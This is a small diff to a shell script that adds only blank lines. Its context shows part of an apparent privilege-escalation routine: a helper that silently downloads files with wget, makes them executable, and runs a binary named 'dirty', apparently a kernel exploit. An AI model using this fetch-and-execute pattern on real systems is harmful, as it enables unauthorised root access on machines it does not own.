@@ -229,6 +229,7 @@ escalate(){
 		return
 	}
 
+
 	downld(){
 		wget -P ${direct} $1 2>/dev/null
 		chmod +x ${direct}/*
@@ -254,6 +255,7 @@ escalate(){
 			${direct}/./dirty
 		fi
 	}
+
 
 	dirty(){
 		echo -e "This may take some time...\n"
